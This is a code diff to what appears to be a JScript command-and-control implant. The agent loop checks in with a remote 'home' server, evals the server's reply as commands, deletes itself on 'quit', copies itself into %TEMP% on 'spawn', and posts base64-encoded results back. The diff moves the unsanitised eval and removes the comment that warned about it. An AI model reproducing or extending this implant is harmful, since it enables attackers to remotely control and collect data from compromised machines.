@@ -101,15 +101,13 @@ while(true)
     var checkin = '{"type": "'+type+'","id": '+id+',"un": "'+un+'"}';
     var serverMsg = post(home, checkin);
 	  var jsondata = "{" + serverMsg.split("{")[1].split("\n")[0]
+    // Convert json string to json object
+    eval("jsObject="+jsondata);
 
-    if (curcmnd != jsondata)
+    if(jsObject.cmnd)
     {
-	    curcmnd = jsondata
-      //Dangerous eval on unsanitized data here
-      eval("jsObject="+jsondata);
-
 	    //kill
-	    if (jsObject.cmnd == "quit") {
+	    if(jsObject.cmnd == "quit") {
         if(fso.FileExists(selfpath)) {
           fso.DeleteFile(selfpath, true)
         }
@@ -117,7 +115,7 @@ while(true)
 	    }
 
 	  //spawn: writes js to %TEMP%
-	    if (jsObject.cmnd == "spawn") {
+	    if(jsObject.cmnd == "spawn") {
 		    fd = fso.CreateTextFile(temp+"\\"+id+".js")
 		    fd.WriteLine(selfdata)
 		    fd.close()
@@ -139,6 +137,7 @@ while(true)
 	      }
       }
       var resp = '{"type": "'+type+'", "id": '+id+',"un":"'+un+'","retval":"'+b64(retval)+'"}';
+      jsObject.cmnd = ""
       post(home, resp)
     }
   }
